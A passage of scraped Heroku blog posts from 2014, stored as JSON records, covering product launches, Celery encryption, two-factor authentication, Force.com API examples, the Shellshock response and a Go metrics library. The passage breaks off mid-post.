{"website": "Heroku", "title": "Welcome to Heroku, CloudBees developers", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/welcome_to_heroku_cloudbees_developers", "abstract": "Welcome to Heroku, CloudBees developers Posted by Craig Kerstiens September 12, 2014 Listen to this article The key to any startup is focus -- focusing in multiple directions is really no focus at all. Following this premise we understand the decision by CloudBees to double down on their continuous integration offering of Jenkins, and to discontinue their platform as a service product.  Continuous integration is already playing an important role in application development and deployment and will only continue to grow in the future. Many of us are fans of Jenkins, and in fact we have many Heroku customers today taking advantage of Jenkins and other CI services . We’re also pleased to see CloudBees suggest that users migrate their PaaS services to providers like Heroku , and we’d like to welcome those developers to give us a try. To that end, if you have an application that is already running on CloudBees, we’ve put together some guides to help you with the migration process: Migrating Play apps from Cloudbees to Heroku Migrating Spring Boot applications to Heroku from CloudBees Deploy Scala and Play Applications to Heroku from Jenkins CI We hope to make the migration process as easy as possible. Get started migrating today by signing up .", "date": "2014-09-12,"},
{"website": "Heroku", "title": "Securing Celery on Heroku", "author": ["David Gouldin"], "link": "https://blog.heroku.com/securing-celery", "abstract": "Securing Celery on Heroku Posted by David Gouldin September 14, 2014 Listen to this article Celery is by far the most popular library in Python for distributing\nasynchronous work using a task queue. If you're building a Python web app,\nchances are you already use it to send email, perform API integrations, etc.\nMany people choose Redis as their message broker of choice because\nit's dead simple to set up: provision a Redis add-on, use its environment\nvariable as your BROKER_URL , and you're done. But the simplicity of Redis\ncomes at a cost.  Redis does not currently support SSL , and\nit doesn't seem like that's going to change any time soon .\nBecause Heroku add-ons communicate over the public web, that means the contents\nof Celery jobs are traveling unencrypted between dynos and Redis. Luckily, this is a solvable problem. At Heroku, we often use Fernet to symmetrically encrypt information over the wire. Kombu , Celery's\nmessaging library, supports custom serializers, giving us control over how\nCelery jobs are turned into byte strings to be sent to the message broker and\nvice versa. We've wrapped all of the default serializers that come with Kombu in\nFernet encryption (provided by Cryptography ) and published them\nin an open source library called kombu-fernet-serializers . To use the library, add kombu-fernet-serializers to requirements.txt , store\nyour Fernet key in an environment variable called KOMBU_FERNET_KEY , and tell\nCelery to use one of the serializers it supplies via Setuptools entry-points : import os\nfrom celery import Celery\nfrom kombu_fernet.serializers.json import MIMETYPE\n\napp = Celery('tasks', broker=os.environ['REDIS_URL'])\napp.conf.update(\n    CELERY_TASK_SERIALIZER='fernet_json',\n    CELERY_ACCEPT_CONTENT=[MIMETYPE],\n) Now you can take advantage of the ease of configuration Redis boasts without\nhaving to worry about leaking sensitive information. python celery", "date": "2014-09-14,"},
{"website": "Heroku", "title": "Stuff Goes Bad", "author": ["Fred Hebert"], "link": "https://blog.heroku.com/erlang-in-anger", "abstract": "Stuff Goes Bad Posted by Fred Hebert September 16, 2014 Listen to this article The Heroku Routing team does a lot of work with Erlang, both\nin terms of development and maintenance , to make sure the platform scales smoothly\nas it continues to grow. Over time we've learned some hard-earned lessons about making systems that can\nscale with some amounts of reliability (or rather, we've definitely learned what doesn't work), and about what kind of operational work we may expect to have\nto do in anger. This kind of knowledge usually remains embedded within the teams that develop\nit, and tends to die when individuals leave or change roles. When new members\njoin the team, it gets transmitted informally, over incident simulations, code\nreviews, and other similar practices, but never in a really persistent manner. For the past year or so, bit by bit, I've tried to grab the broad lines of this\nknowledge and to put it into a manual, that we're proud to release today. From the introduction: This book intends to be a little guide about how to be the Erlang medic in a\ntime of war. It is first and foremost a collection of tips and tricks to help\nunderstand where failures come from, and a dictionary of different code\nsnippets and practices that helped developers debug production systems that\nwere built in Erlang. This is our attempt at bridging the gap between most tutorials, books, training\nsessions, and actually being able to operate, diagnose, and debug running\nsystems once they've made it to production. This manual adds to the Routing team's efforts to interact with the Erlang (and\npolyglot) community at large, sharing knowledge with teams from all over the\nplace. It is available in PDF for free, under a Creative Commons License ,\nat erlang-in-anger.com It comes just in time for the Chicago Erlang conference, dedicated to real world applications in Erlang, where you'll be able\nto talk to a few members of Heroku's Routing team, and a bunch of regulars from\nthe Erlang community. We hope this will prove useful to the community! Also, Heroku is hiring! Check out our jobs page for\nopportunities to work on production systems at scale. routing erlang", "date": "2014-09-16,"},
{"website": "Heroku", "title": "Introducing Heroku DX: The New Heroku Developer Experience", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/introducing-heroku-dx", "abstract": "Introducing Heroku DX: The New Heroku Developer Experience Posted by Jesper Joergensen September 23, 2014 Listen to this article One of our core beliefs at Heroku is that developers do their best work when the development process is as simple, elegant, and conducive to focus and flow as possible. We are grateful for how well many of our contributions to that cause have been received, and today we are making generally available a new set of features that have been inspired by those values. Collectively, we call these new features Heroku DX—the next evolution in Heroku’s developer experience. Our goal with these new features—Heroku Button, Heroku Dashboard + Metrics and Heroku Postgres DbX—is to make it faster than ever for developers to build, launch and scale applications. Heroku Button Heroku is known for making it easy to get started on a new app. Many tutorials and sample apps contain step-by-step guides for deploying to Heroku because it is one of the easiest platforms to start on. But we wanted to make it even easier. We wanted step 2 to be: “There is no step 2”. Heroku Button makes this a reality. With a single click you can set up a new app from sample code, complete with environment configuration, Add-ons and the first deploy. Any public GitHub project can be Heroku Button enabled simply by adding an app.json file with some additional metadata . During the beta, we saw over 400 Heroku Buttons created, including examples from Dropbox , Twilio , Uber and Coinbase . As part of general availability, we are launching a real-time view into the Heroku Button community at buttons.heroku.com , which is continually updated with the newest and most popular buttons. Heroku Dashboard + Metrics At the center of Heroku DX is an entirely new web Dashboard redesigned from the ground up for improved developer experience. Under the hood, the new Dashboard is written in Ember.js, allowing for faster and smoother interactions.  At the surface, a new visual design makes navigating your collection of apps and associated resources and properties simpler.  New interaction patterns, such as drag and drop app assignment, simplify previously complex tasks.  As a modern web app, the new Dashboard is fully responsive, and works across devices and screen sizes, making it easy to manage and scale your Heroku apps wherever you go. A new Activity section in Dashboard makes it dramatically easier for developers to collaborate. Every activity on every app shows up in the Dashboard so everyone on the team knows what’s going on. You can even inspect the build output from team members’ builds and help them troubleshoot problems right there in the Dashboard. With Heroku DX, we are also introducing a significant enhancement to the runtime management of your apps with a new Metrics section in Dashboard that gives you a refreshingly simple and straightforward view on your application’s performance. Heroku Metrics surfaces the key runtime attributes of your application, including Response Time, Requests / Sec, and CPU, and adds an intelligence layer that automatically surfaces the key recommendations and performance changes. Unified across a single time axis, the relationship between applications metrics is made clear, allowing you to easily see their interactions. The new Metrics feature is available for any application that has been scaled to more than one running dyno. Heroku Postgres DbX At the center of many applications running on Heroku is Heroku Postgres, and as part of the Heroku DX launch we are releasing one of our most significant upgrades ever to our Postgres Database-as-a-Service.  These new Postgres features—or Heroku Postgres DbX—are designed to advance the experience of developing and managing databases in a way that is similar to how Dashboard enhances the other related parts of your developer experience. At the core of Postgres DbX is a new lineup of database plans , which on average offer 2-3X performance of our previous plans while keeping the same price.  Premium plans and above also automatically gain encryption at rest, simplifying many compliance requirements. Heroku Postgres’ most prominent addition is Performance Analytics .  Understanding the operating and behavior of a relational database—in a way that is clear and actionable—typically requires an uncommon set of tools, skills and patience.  Performance Analytics reveals one of the key benefits of the “as-a-Service” model as applied to databases; a complex pipeline of configuration, logs, processing and visualization is reduced to a simple and immediate web experience for the developer. Learn More The Dev Center provides detailed technical information on all of the features launched today.  You can also learn more by registering for an online session we’ll be delivering on October 8 .", "date": "2014-09-23,"},
{"website": "Heroku", "title": "Two-factor Authentication Now Generally Available", "author": ["Jesper Joergensen"], "link": "https://blog.heroku.com/two-factor-authentication-ga", "abstract": "Two-factor Authentication Now Generally Available Posted by Jesper Joergensen September 25, 2014 Listen to this article Two-factor authentication is a powerful and simple way to greatly enhance security for your Heroku account. It prevents an attacker from accessing your account using a stolen password. After a 4 month beta period, we are now happy to make two-factor authentication generally available. Turning on two-factor authentication You can enable and disable two-factor authentication for your Heroku account in the Manage Account section of Dashboard. Before you turn it on, please read on here to understand the risks of account lock-out. You can also refer to the Dev Center docs for more details. How two-factor authentication protects you Without two-factor authentication, an attacker can gain access to your Heroku account by just knowing your password. The most common way attackers get access to passwords is by hijacking email accounts and issuing a password reset request. If you reuse the same password for multiple services, an attacker may also learn your password if one of your other services are compromised and its password database leaks (therefore, never use the same password for multiple services). After you turn on two-factor authentication, you can only authenticate by providing both the password and a \"second factor\" code. The second factor code is a code that can only be used once or that expires very quickly (30-60 seconds). You obtain the code from an authenticator app on your mobile device. Now, it is only possible to access your account by knowing your password and having access to your (unlocked) mobile device. If you lose your two-factor device When you enable two-factor authentication, it is critical that you download a set of recovery codes and store them in a safe place. If you lose your mobile device or if it gets wiped, you can authenticate using these recovery codes in place of the two-factor code generated by your device. If you have enabled two-factor authentication and not saved your recovery codes, go to the accounts page now and download your codes . If for some reason you have neither your two-factor device nor your recovery codes, there are a few additional ways you may be able to recover. Your responsibility when turning on two-factor authentication When you enable two-factor authentication, please understand that It is possible for you to lock yourself out of your account with no ability to regain access. It is critical that you download recovery codes and store them in a place where you can access them in case of an emergency. If you are locked out and none of the recovery methods work for you, there is no guarantee that you can regain access to your account because we may not be able to confirm ownership of the account. In the future, we may add additional forms of account ownership verification to aid in cases of lock-out, but there is no single solution that fully solves this problem. Therefore, please do save those recovery codes ! What two-factor authentication does not protect against Security is a multi-faceted problem and two-factor authentication is not designed to protect against all possible attacks. For example, it will not protect you against malware that gives a remote attacker access to your computer. Two-factor authentication is specifically designed to protect against password leaks. You should continue to follow all other security best practices to achieve maximum protection.", "date": "2014-09-25,"},
{"website": "Heroku", "title": "The Heroku Mobile App Template", "author": ["Scott Persinger"], "link": "https://blog.heroku.com/heroku-mobile-app-template", "abstract": "The Heroku Mobile App Template Posted by Scott Persinger October 01, 2014 Listen to this article One of the challenges when starting a mobile app project is deciding what technology stack to use. Should the client app use iOS or Android native, mobile web, or a hybrid? Do the backend in Node, Ruby, or Java? Or skip the backend and use an Mobile Backend-as-a-Service? To help avoid needing to answer all those on your own we are open sourcing the Heroku Mobile Template . This app provides a full-stack starting point for creating new hybrid mobile apps and deploying them to Heroku. What’s in the box? The template application implements a simple real-time mobile Quiz app called “Quiz Live”. It uses an AngularJS client-side application which runs on the phone, and a Node.js server side application to provide authentication, data storage, and notifications. Persistent data is stored in a Postgres database. This app collects a curated set of libraries and patterns to give you a complete template for building a new mobile app: Ionic Framework This mobile UI component library lets you quickly build mobile app UIs that feel very natural on a phone, and work across both iOS and Android devices. AngularJS This single-page web app framework gives you the power and structure to create advanced apps that run great in mobile browsers with a minimum of code. Our entire sample app uses approximate 300 lines of Javascript for the client app. Apache Cordova You can test and deploy apps directly over the web, but the Cordova project makes it very easy to compile your HTML/JS assets into a native app which can be deployed through the Apple or Google app stores. Node Express The express framework for Node.js provides a flexible framework for implementing APIs and other server-side logic for your app. Using Javascript front-to-back enables developers to leverage their skills throughout the stack. SocketIO The gold standard for real-time communication makes it trivial to distribute state changes in real-time to users of your app. Our Quiz Live sample app shows how easily you can leverage Websockets to create super-engaging user experiences with your app, without getting into the complexities of mobile push notifications. (You can still add push notifications later.) BookshelfJS This ORM for Node enables you to easily store and retrieve JSON data very naturally in Postgres ( https://www.heroku.com/postgres ). The JSON data type in Postgres makes it easy to store JSON data without having to give up the power of SQL and a proven, scalable data store. Getting started Head over to Github and fork the repo https://github.com/heroku/mobile-template1 . Now click the Heroku Button on the README to deploy your own copy of the template app. To run the app locally you just need Postgres and Node.js installed on your machine. Integrating with Force.com To integrate with data and services from Salesforce, checkout the notes on Force.com integration from the template. The Quiz app includes an example showing how to create Lead records \nbased on users that register for the Quiz. If you are working in Ruby or another technology on the server, checkout this post detailing some other good packages for integration with Force.com. Going further Salesforce is bringing back the $1M hackathon this year, and the prizes will go to the best mobile apps built on the Heroku and Force.com platforms. We hope this app template can help everyone who is looking for an easy way to get started. Obviously this template doesn’t do everything you might want to do in your app. If you need a different kind of front-end, have a look at the Ionic tutorials to learn about how to choose a different theme or layout for your UI. For more device capabilities, checkout the growing registry of Cordova plugins that enable all sorts of functionality. For push notifications there are a number of service providers in the Heroku Add-on marketplace . If you’re ready to deploy to an app store, checkout the instructions for wrapping your app in a Cordova wrapper. Deploying to the Google Play store is fairly straightforward, but deploying through the Apple App Store still requires that you enroll with Apple’s developer program and follow their steps for App Store submission. We recognize that this mobile template doesn’t work for every type of app. Many games or apps that heavily rely on device features will need to be written as native apps. But we’re confident that a growing class of world class apps can be built using this template. We are still improving this template, and we welcome your feedback. And we’d love to hear about the apps that you’ve built. mobile", "date": "2014-10-01,"},
{"website": "Heroku", "title": "Heroku at the Salesforce Hackathon", "author": ["Craig Kerstiens"], "link": "https://blog.heroku.com/heroku_at_the_salesforce_hackathon", "abstract": "Heroku at the Salesforce Hackathon Posted by Craig Kerstiens October 02, 2014 Listen to this article As part of Salesforce’s Dreamforce conference, Salesforce is hosting its second major hackathon on October 10-12 in San Francisco .  The format for this year’s hackathon has been expanded to include specific categories for not just Heroku, but also some of our favorite open source projects.  With over ten prizes of more than $10,000 each, this is a great opportunity to build something cool, take advantage of some of the latest Heroku features , and help your favorite open source projects. Heroku Category Heroku has long focused on helping you build apps. In looking at the data we have on the over 5 billion requests Heroku serves each day, the percentage coming from mobile devices has grown over time to be a substantial amount. Focusing on building your app functionality vs. scaling and keeping the lights on is the reason we see so many mobile and other apps on Heroku. That's why this year there is a category at the Salesforce Hackathon just for mobile apps which utilize Heroku. Build a mobile app or browser app that works on mobile which is backed by Heroku during the hackathon and you're eligible. Of course we're excited to see how creative you can be with it, so introducing connected devices is always a plus. To make it even easier for building mobile apps we’ve released some open source tooling to help you along. You can read more on this and grab the code from our engineering blog . Open Source Category Beyond seeing awesome apps built, one area especially dear to our heart is the open source categories. In addition to competing in the main Heroku, Force.com, and Heroku + Force.com category there are some prizes reserved just for open source contributions. We heavily leverage open source at Heroku, contribute back to projects, and release our own , and we want to encourage others to do the same.  If you create a library or make a contribution to some open source project as part of the hackathon, you're eligible to win a $5,000 prize just for contributing – you don't have to be a winner in another category. Our open source categories this year are: Ruby Node Python Postgres We're looking forward to see what comes out of this. We’re also pretty excited to be giving away a total of $20,000 to organizations to help further open source. Each of the four open source winners will get to choose an open source non-profit to which we’ll make an extra $5,000 donation, above and beyond the prize to the winners. In other words, if you win, your favorite OS organization will win too. What is the Salesforce Hackathon? Just in case you’re unfamiliar with the Hackathon… The Salesforce $1 Million Hackathon happens October 10th through the 12th at City View in San Francisco.  It’s free and open to all developers – the full details are here – if you are anywhere near the Bay Area or can get here, come on by . There are plenty of opportunites to win, with over 35 prizes in total across three main categories of Force.com, Heroku, and Force.com with Heroku and some special awards just for open source.  It’s a full-weekend hackathon – come and go as you need, or stay overnight (food is provided) – and the Salesforce team has some cool stuff in store for attendees.  I’ll be spending much of my time there checking out what people are building, answering questions, and helping troubleshoot Heroku issues along with several other Herokai. Whether you’re looking to build an app that scratches an itch you’ve had for a while, kick start your startup, or just connect with others and build awesome apps, the hackathon is your place to do it. We look forward to seeing all the awesome apps that come out of it and connecting with everyone there. Get registered for it today before it’s full. If you’re new to Heroku make sure to create your account as well and be sure to say hi to the Herokai supporting the event - we’ll all be wearing purple t-shirts.", "date": "2014-10-02,"},
{"website": "Heroku", "title": "Getting started with the Force.com APIs for the Hackathon", "author": ["Scott Persinger"], "link": "https://blog.heroku.com/hackathon-force-getting-started", "abstract": "Getting started with the Force.com APIs for the Hackathon Posted by Scott Persinger October 06, 2014 Listen to this article With the Salesforce hackathon fast approaching, I wanted to give a quick overview\non building apps that use the force.com APIs (part of the Salesforce1 platform). The force APIs are rich and varied, so sometimes just getting started can seem\na little daunting. What services are provided? The force.com APIs give your application access to the authentication, data storage,\nand business rule services provided by the Salesforce1 platform. Some of the\nthings you can do with the APIs include: Authenticate users based on a Salesforce username and password Query any data stored in a Salesforce account. Data access rules for the\nauthenticated user are automatically applied. Create or update records in a Salesforce account. Data access rules for the\nauthenticated user are automatically applied. Perform a free text search across all records in an account. Store and retrieve your own application-specific data in the Salesforce \naccount. This list covers the \"core\" force.com APIs. There are additional APIs\nfor other services, and higher level access tools including Apex\nand Visualforce which are beyond our scope here. Web application patterns The Salesforce1 platform supports two primary architectures for building\nintegrated web applications: Salesforce1 \"native\" applications using Apex and Visualforce, or\nJavascript + HTML. Connected applications which integrate via the SOAP or REST API In the first case, you write your application code in the Apex language\nand use the Visualforce framework to build your web pages. You don't\nrun any web or application servers yourself - all your code runs in the\nforce.com environment. You can also implement single-page apps using\nAngularJS, Ember or something similar where your Javascript is served\nby force.com. In the second case, you write your application code in any language\nyou choose, and deploy your code to your own web and application servers\n(or deploy to a cloud host like Heroku). Your application integrates\nwith force.com by making HTTP calls on the SOAP or REST APIs. This\npattern is more flexible, but leaves you with more choices to make and more\nwork to do. Mobile application patterns Because mobile apps introduce their own native-client environments, the\nchoices for building mobile apps on Salesforce1 are a little more varied. Build a hybrid app extension to the Salesforce1 app . Using Javascript\nand HTML, you can build new mobile pages which appear\ninside the Salesforce1 native app available for iOS and Android. User\nauthentication comes for free since the user has authenticated into the\nSalesforce1 app. This corresponds most closely with our web pattern\nnumber 1 above. The result is: HTML+Javascript front-end, force.com back-end. Build a native mobile app on iOS or Android, and use the force.com APIs\ndirectly in the mobile client by using the Salesforce iOS or Android SDKs.\nUsers are authenticated with individual force.com logins.\nThis is: native front-end, force.com back-end. Build a native or hybrid mobile app which talks to a web application\nthat itself uses the force.com APIs . All use of the force APIs is done\nserver-side, and your client just talks to your custom API. Typically\nuser accounts are stored in your application, and you use a single \n\"API user\" to access force.com. This corresponds to our web pattern\nnumber 2 above. We can call this the \"force.com proxy\" model. Getting started The following instructions will be useful if you want to build and deploy\na Connected App which talks to the force.com APIs. If you are interested in\nbuilding an app directly on Salesforce1, checkout the Force.com Workbook Tutorial for help getting started. Before writing any code, I recommend that people try out the force.com APIs\nto get a sense of how they work. First, register for a free \n\"Developer Edition\" Salesforce account: http://developer.salesforce.com . These\ntrial accounts are free but include full API access and all developer\ntools. Now open a tool called the Salesforce Workbench : https://workbench.developerforce.com The workbench makes it very easy to browse the Salesforce data model and all\nthe Salesforce APIs. Your developer account will have preset data that you\ncan query and modify. Authentication The first step to using any of the force.com APIs is to authenticate in to\nSalesforce. There are two primary mechanisms to do this: Oauth web flow .\nThis is an Oauth2 standard flow. Use this mechanism when each user of your\napp will have their own Salesforce login. Password + token login. If you are using the \"single API user\" approach, then\nthe simplest authentication approach is to send a username and password to the\nAPI login endpoint. For increased security however it isn't sufficient to provide\njust the password. You also need to present a 'security token'. Login to Salesforce\nwith your API user account, then go to My Settings -> Personal -> Reset My Security Token\nand click the green button. Salesforce will send you a security token by email. Accessing the API There are a variety of SDKs that make accessing the Force.com APIs very easy. Pick a library that works with your\nlanguage and get it installed. For the examples below I will show a Ruby example, using the Restforce library, and a Node.js example using the Nforce library. You can install one of these as follows: $ gem install restforce\n$ npm install nforce To connect to Salesforce you need to define a Connected App in your Salesforce account. \nFollow these instructions to create your Connect App. The Connected App creates an Oauth consumer key and secret which you\nneed to authenticate to the force.com API. Note that even though you create a Connected App inside of one Salesforce account, your app can access any Salesforce acccount using the same Oauth credentials. Gather the following pieces of information for accessing the Force.com API: Oauth consumer key Oauth consumer secret Oauth redirect URI API user username API user password API user security token A good practice is to set all of these values in the environment for your app. On Heroku\nyou can set config vars ('heroku config:set name=value') for these values. Note that if you are using the \"API user\" pattern, then the Oauth redirect URI can be any\nvalue that you want, but it must match the value you entered into the Connected App . Now, we are actually in position to authenticate into Force.com: Ruby example require 'restforce'\n\nclient = Restforce.new :username => 'foo',\n  :password       => 'bar',\n  :security_token => 'security token',\n  :client_id      => ENV['SF_OAUTH_CLIENT_ID'],\n  :client_secret  => ENV['SF_OAUTH_CLIENT_SECRET'] Node example var nforce = require('nforce');\n\nvar org = nforce.createConnection({\n  clientId: process.env('SF_OAUTH_CLIENT_ID'),\n  clientSecret: process.env('SF_OAUTH_CLIENT_SECRET'),\n  redirectUri: 'http://localhost:3000/oauth/_callback'\n});\n\norg.authenticate({ username: username, password: password + token}, function(err, resp){\n    // Use 'org' ...\n}); Reading data Salesforce data follows a relational model. Instead of 'table' however, Salesforce\nrefers to 'objects', such as 'Contact' and 'Account'. One row from the table\nis referred to as an \"instance\" or more typically a \"record\". Reading data is very easy. Force.com supports a simplified varient of SQL called SOQL . Let's see how to read 20 Account records from Salesforce: Ruby example accounts = client.query(\"select Id, Name, AccountNumber from Account limit 20\") Node example var accounts = org.query({ query: 'select Id, Name, AccountNumber from Account limit 20' }, function(err, resp){\nif(!err && resp.records) {\n    resp.records.forEach(function(account) {\n        console.log(account.get('Name'));\n    });\n} Writing data To write new records, just create an empty object of the correct type and save it. Ruby example client.create('Account', Name: 'Foobar Inc.', AccountNumber: 'ACT101') Node example var acc = nforce.createSObject('Account');\nacc.set('Name', 'Foobar Inc.');\nacc.set('AccountNumer', 'ACT101');\n\norg.insert({ sobject: acc }, function(err, resp){\n  if(!err) console.log('Account inserted');\n}); Going further The Heroku Mobile template provides a full example for accessing \nForce.com from your web server app. Hopefully these instructions have gotten you started working with the Force.com APIs. There are lots of other\nresources out there with more information including the StackExchange group dedicated to Saleforce development. Force.com", "date": "2014-10-06,"},
{"website": "Heroku", "title": "Behind the Heroku Platform: How We Create Non-events for Customers", "author": ["Charles Hooper"], "link": "https://blog.heroku.com/behind_the_heroku_platform_how_we_create_non_events_for_customers", "abstract": "Behind the Heroku Platform: How We Create Non-events for Customers Posted by Charles Hooper October 07, 2014 Listen to this article As an SRE (Service Reliability Engineer) at Heroku, one of the things I’m exposed to is how much work happens behind the scenes in order to create what we call “non-events” for you, our users. A non-event is turning something that would typically create work for an application hosted on traditional infrastructure into something that the user won’t even notice. This is something we put a lot of energy into because we believe in letting our users run apps instead of managing infrastructure. We make this investment because we know that for every hour you spend managing infrastructure, that’s an hour less spent on building or maintaining your application. We know that you need to be able to iterate quickly in order to have a competitive advantage and you’ll have a more difficult time doing that if you’re also managing infrastructure. Two examples of these non-events from recent weeks are the “Shellshock” security flaw and Amazon having to reboot a large number of instances due to a security vulnerability in their hypervisor. This post is about what happened behind the scenes at Heroku to shield our users. Shellshock First, we’ll start by discussing the Shellshock security flaw. Shellshock, known more formally as CVE-2014-6271 , is a security vulnerability which could allow an attacker to remotely execute arbitrary code. What made this one particularly severe was how widespread it was -- it was present on nearly any UNIX-like system, from Jane and John Doe’s MacBook Air, to their home router, to a Heroku dyno. On Wednesday, September 24th, when we were made aware of this vulnerability, we responded immediately. Thanks to the fast response from our Security team and multiple engineering teams, we were able to deploy multiple patches to thousands of servers to protect our users inside of twelve hours. Our customers’ apps became more secure before many of them even heard about this vulnerability, and that’s the way we like it. Mass Reboots Next, we had to ensure that Amazon’s mass reboots were not going to disrupt or degrade your applications. For the unaware, Amazon announced two weeks ago that they were going to be rebooting large numbers of instances in order to patch an unnamed (at the time) security vulnerability . Of course, Amazon was not alone, many infrastructure providers responded to this vulnerability in the same manner. Reboots are a necessary part of maintenance and the ongoing operation of a service, which is why we ensure that our platform is erosion resistant . When Amazon originally reached out to us on Wednesday, September 24th, we were not yet aware of which or how many of our instances were going to be rebooted.  Rather than wait and risk getting caught off-guard, we put together a plan that should have allowed us to survive the loss of each availability zone over four to five days in both the US and the EU regions. In addition to the technical plan, we also made sure that our on-call engineers and incident commanders were ready for a long weekend. When we were finally able to learn which instances were going to be rebooted, we were able to scale this plan back significantly, even avoiding the maintenance period for some services by preemptively evacuating the availability zones that were scheduled for maintenance. In the end, we did have one minor logging incident that was related to the Amazon reboots, but because of our careful planning we were able to turn this maintenance window largely into a non-event for most of our customers. The Heroku Difference One of the major benefits of running your applications on Heroku versus any of the alternatives are the non-events. On Heroku, non-events are built-in but on other platforms, you still need a team of people who have the time and expertise to absorb the Shellshock and AWS mass reboot surprises. They must manage your infrastructure, track security vulnerabilities, carry a pager, and turn surprises into non-events for you. With Heroku, all of these things are done for you -- allowing you to focus on building great experiences for your users.", "date": "2014-10-07,"},
{"website": "Heroku", "title": "Introducing Heroku CX Patterns: Building Customer Experiences on Heroku with Salesforce Services ", "author": ["Margaret Francis"], "link": "https://blog.heroku.com/introducing_heroku_cx_patterns", "abstract": "Introducing Heroku CX Patterns: Building Customer Experiences on Heroku with Salesforce Services Posted by Margaret Francis October 13, 2014 Listen to this article A quick glance at most any phone shows the importance and urgency – for businesses of all kinds – of creating mobile customer apps.  Our everyday activities – finding a ride , ordering a meal or turning on a light are increasingly mobile experiences. But delivering a great omnichannel experience to customers requires more than just the work of the application developer. The larger organization is involved in following up with prospects, fielding service inquiries, and sending relevant marketing messages. Orchestrating this tapestry of touchpoints often requires developers to integrate with systems used by non-developers, including sales, service, marketing and community management systems. At Heroku, our core belief around making the developer experience as simple as possible extends to the ecosystem of Salesforce products and services with which  developers integrate their applications. Today we are releasing Heroku CX  Patterns, a set of reference architectures and technical resources for creating a comprehensive customer experience with Heroku and Salesforce. With Heroku CX Patterns, developers can get starter apps, sample code, and documentation that will help them build out apps that utilize a wide range of Salesforce services. Nibs: Sample App for Mobile Customer Experiences The fictional setup for the primary starter app, “Nibs,” is that of a high end chocolatier looking to engage customers via a loyalty mechanic triggered by in-app activities.  The base loyalty application is deployable via Heroku Button. Additional documentation and sample code inside the Nibs GitHub project can be used as a guide for developers that want to enhance the baseline customer experience through integrations with other Salesforce products.  Optional modules include live video chat for customer service, in-app push notifications through Marketing Cloud, a Salesforce Communities integration, and a Journey Builder custom activity app. Much of the power of Nibs comes from the content and customer data synchronization between Heroku Postgres and Salesforce via Heroku Connect . Heroku Connect is a bi-directional data synchronization service between Salesforce and Heroku Postgres that enables developers that know SQL to work with Salesforce data inside a Heroku Postgres database.  This makes its easy for developers to deliver mobile apps to customers that seamlessly integrate with Salesforce data. Developers looking for a more basic starting point for building and deploying hybrid mobile apps on Heroku can begin with recently released Heroku mobile app template , which provides an open source full-stack starting point for creating new hybrid mobile apps and deploying them to Heroku.  Built as a hybrid AngularJS app composed of HTML, CSS and Javascript, and using Ionic, an open source framework for creating hybrid mobile apps with HTML5, the server side is implemented as Node.js application running on top of a Postgres database.  This is the foundation upon which Nibs is built. New Salesforce Features for Customer Engagement In addition to the core Salesforce apps – Sales Cloud and Service Cloud – which can be integrated with Nibs via Heroku Connect, Nibs includes support for other members of the Salesforce product family via direct API sample code and documentation.  These include: SOS: Live video chat embedded in mobile apps Marketing Cloud: In app push notifications Journey Builder: 1:1 customer journeys triggered by in-app activities and powered by custom Journey Builder apps running on Heroku Heroku CX Patterns at Dreamforce The intent of Heroku CX Patterns is to provide a example for developers to layer Salesforce services into their Heroku customer engagement apps.  Developers can start simply and build out the app experience over time, as various products and services become relevant to their particular use case.  Join us at Dreamforce this week learn more about Heroku CX Patterns and Nibs. There are several Nibs/ Heroku Connect breakout sessions listed in the DF14 Agenda , with demos in the Dev Zone, the Campground, and at Lightning Theater throughout the event. HerokuConnect Force.com salesforce marketingcloud sos cxpatterns cx", "date": "2014-10-13,"},
{"website": "Heroku", "title": "Instrumentation by Composition", "author": ["Timothée Peignier"], "link": "https://blog.heroku.com/instrumentation-by-composition", "abstract": "Instrumentation by Composition Posted by Timothée Peignier October 22, 2014 Listen to this article Heroku provides many instrumentations for your app out of the box through our new Heroku developer experience . We have open-sourced some of the tools used to instrument Heroku apps,\nbut today’s focus will be on instruments , a Go library that allows you to collect metrics over discrete time intervals. What is instruments? Instrumentation is the art and science of measurement and control of process variables within a production system.\n Instruments attached to a system may provide signals used to operate the system like circuit breakers or to alert a human operator. The instruments library allows you to collect and report metrics inside your application,\nsuch that you might be keeping track of requests made along with their latency, or the number of elements in a data structure. rate := instruments.NewRate()\nlatencies := instruments.NewTimer(1024)\nlatencies.Time(func() {\n  rate.Update(1)\n  copy(make([]int, 10), rand.Perm(10))\n}) To achieve this, it provides some these base instruments: Counter holds a counter that can be incremented or decremented. Rate measures the rate of events over time. Reservoir measures the distribution of values in a stream of data. Gauge returns last value recorded. Derive measures the rate of events over time, based on the delta with previous recorded value. Timer measures the distribution of the duration of events. These instruments collect metrics over a specific time-window, and expect a single reader to request the current value of a metric.\nThe value you obtain will only reflect observations made during the last time-window and not prior windows.\nThis allows them to be reset and to be a really good fit for measuring performance characteristics. Composability An instrument can be composed on top of other instruments, as long as they respect one of two interfaces\nfor collecting metrics: one for discrete values and one for sampled values. // Discrete represents a single value instrument.\ntype Discrete interface {\n  Snapshot() int64\n}\n\n// Sample represents a sample instrument.\ntype Sample interface {\n  Snapshot() []int64\n} These two simple interfaces allow you to create your own instruments, on top of the built-in ones. As an example, let us collect HTTP request sizes made on a upload endpoint.\nIn order to do that, we will create a custom instrument that will act as an http.Handler and collect request size through a Reservoir instrument. type RequestSizes struct {\n  r *instruments.Reservoir\n  http.Handler\n}\n\nfunc NewRequestSizeHandler(h http.Handler) *RequestSizes {\n  return &RequestSizes{\n    r:       instruments.NewReservoir(0),\n    Handler: h,\n  }\n}\n\nfunc (rs *RequestSizes) Update(r *http.Request) {\n  rs.r.Update(r.ContentLength)\n}\n\nfunc (rs *RequestSizes) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n  rs.Update(r)\n  rs.Handler.ServeHTTP(w, r)\n}\n\nfunc (rs *RequestSizes) Snapshot() []int64 {\n  return rs.r.Snapshot()\n} We can now encapsulate any http.Handler and collect the size of the requests it receives: func upload(w http.ResponseWriter, r *http.Request) {\n  w.WriteHeader(200)\n}\n\nfunc main() {\n  sizes := NewRequestSizeHandler(http.HandlerFunc(upload))\n  http.Handle(\"/upload\", sizes)\n  http.ListenAndServe(\":8080\", nil)\n} Base instruments are also taking advantage of composition, the Derive instrument itself is composed on top of the Rate instrument and the Timer instrument is built on top of the Reservoir instrument. Reporting metrics Each instrument returns raw values, utility functions are provided to extract quantile, mean and variance values out of it. // Retrieve raw values.\ns := sizes.Snapshot()\n// Latencies 95th percentile.\nq95 := instruments.Quantile(s, 0.95)\n// Obtain the 